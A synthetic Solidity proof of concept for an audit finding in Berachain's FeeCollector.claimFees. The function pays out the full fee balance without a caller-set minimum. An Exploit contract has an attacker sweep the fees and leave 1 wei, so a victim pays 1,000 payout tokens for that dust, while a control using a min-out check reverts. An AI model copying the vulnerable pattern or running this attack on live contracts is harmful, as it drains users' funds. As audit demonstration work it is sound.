// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Berachain FeeCollector.claimFees pulls payoutAmount of the payout token and
    then sends the full fee-token balance. There is no minimum (Spearbit, Oct 2024).
    SYNTHETIC, cheatcode-free, one transaction.
    The collector holds 1,000 fee tokens. The caller pays 1,000 payout tokens.
    A first claim takes the 1,000 and leaves 1 wei of dust. The victim's claim
    still pays the full 1,000 and receives 1 wei. The control claim requires
    1,000 fee tokens out and reverts, so that payer keeps the 1,000. */

contract Erc20 {
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Harm {
    string public symbol = "PAYOUT-LOST";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract FeeCollector {
    Erc20 public payout;
    address public rewardReceiver;
    uint256 public payoutAmount;

    constructor(address _payout, address _rewardReceiver, uint256 _payoutAmount) {
        payout = Erc20(_payout);
        rewardReceiver = _rewardReceiver;
        payoutAmount = _payoutAmount;
    }

    function claimFees(address recipient, address[] calldata feeTokens) external {
        require(payout.transferFrom(msg.sender, rewardReceiver, payoutAmount), "payout");
        for (uint256 i; i < feeTokens.length; i++) {
            Erc20 fee = Erc20(feeTokens[i]);
            uint256 feeTokenAmountToTransfer = fee.balanceOf(address(this));
            // @> VULN: the whole fee balance is transferred; the caller cannot set a minimum
            require(fee.transfer(recipient, feeTokenAmountToTransfer), "fee");
        }
    }
}

contract Payer {
    function approve(address token, address spender, uint256 amount) external {
        Erc20(token).approve(spender, amount);
    }

    function claim(address collector, address[] calldata feeTokens) external {
        FeeCollector(collector).claimFees(address(this), feeTokens);
    }

    function donate(address token, address to, uint256 amount) external {
        require(Erc20(token).transfer(to, amount), "donate");
    }

    function claimWithMin(address collector, address[] calldata feeTokens, uint256 minOut) external {
        Erc20 fee = Erc20(feeTokens[0]);
        uint256 beforeBal = fee.balanceOf(address(this));
        FeeCollector(collector).claimFees(address(this), feeTokens);
        require(fee.balanceOf(address(this)) - beforeBal >= minOut, "slippage");
    }
}

contract Receiver {}

contract Exploit {
    uint256 public constant PAYOUT = 1000 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Harm public harm;
    Erc20 public feeToken;
    Erc20 public payout;
    Receiver public rewardReceiver;
    FeeCollector public buggy;
    FeeCollector public control;
    Payer public attacker;
    Payer public victim;
    Payer public controlPayer;

    uint256 public attackerFees;
    uint256 public victimFees;
    uint256 public victimPayoutLeft;
    bool public controlReverted;
    uint256 public controlPayoutLeft;
    uint256 public lost;

    constructor() {
        harm = new Harm();
        feeToken = new Erc20("FEE");
        payout = new Erc20("PAY");
        rewardReceiver = new Receiver();
        buggy = new FeeCollector(address(payout), address(rewardReceiver), PAYOUT);
        control = new FeeCollector(address(payout), address(rewardReceiver), PAYOUT);
        attacker = new Payer();
        victim = new Payer();
        controlPayer = new Payer();
        feeToken.mint(address(buggy), PAYOUT);
        feeToken.mint(address(control), 1);
        payout.mint(address(attacker), PAYOUT);
        payout.mint(address(victim), PAYOUT);
        payout.mint(address(controlPayer), PAYOUT);
        attacker.approve(address(payout), address(buggy), type(uint256).max);
        victim.approve(address(payout), address(buggy), type(uint256).max);
        controlPayer.approve(address(payout), address(control), type(uint256).max);
    }

    function run() external {
        address[] memory fees = new address[](1);
        fees[0] = address(feeToken);
        require(feeToken.balanceOf(address(buggy)) == PAYOUT, "stock");
        attacker.claim(address(buggy), fees);
        attackerFees = feeToken.balanceOf(address(attacker));
        require(attackerFees == PAYOUT, "swept");
        attacker.donate(address(feeToken), address(buggy), 1);
        require(feeToken.balanceOf(address(buggy)) == 1, "one wei");
        victim.claim(address(buggy), fees);
        victimFees = feeToken.balanceOf(address(victim));
        require(victimFees == 1, "dust out");
        victimPayoutLeft = payout.balanceOf(address(victim));
        require(victimPayoutLeft == 0, "victim paid");
        try controlPayer.claimWithMin(address(control), fees, PAYOUT) {
            controlReverted = false;
        } catch {
            controlReverted = true;
        }
        require(controlReverted, "control passed");
        controlPayoutLeft = payout.balanceOf(address(controlPayer));
        require(controlPayoutLeft == PAYOUT, "kept");
        lost = PAYOUT - victimPayoutLeft;
        require(lost == PAYOUT, "loss");
        harm.mint(SINK, lost);
        require(harm.balanceOf(SINK) == PAYOUT, "marked");
    }
}
